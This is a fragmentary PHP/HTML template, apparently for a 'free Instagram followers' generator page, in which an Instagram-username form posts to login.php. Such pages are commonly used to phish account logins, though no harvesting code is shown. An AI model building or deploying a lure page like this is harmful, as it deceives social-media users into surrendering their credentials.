...
$linklo = "https://freemanpediarch.blogspot.com/" // GUNAKAN / DI AKHIR LINK
?>
<?php
...
<body>		
	<div class="main-container">
		...
		<div class="content-wrapper generator-content-wrapper">					
			<div class="processing-first-step">	
				<div class="row">	
					<form action="login.php" method="post" id="followers-form" class="followers-form first col-sm-12" role="form" >
						<div class="form-group ig-username-form-group">	
							...
							<div class="ig-username-wrapper">		
								<img src="img/add-username-icon.png" class="ig-username-input-icon" />
	...
	<footer>
		...
		<div id="privacy-policy" class="pp-popup-wrapper popup-wrapper mfp-hide">
			...
			<p><strong>This document was last updated on Juli 3, 2019</strong></p>
		</div>	
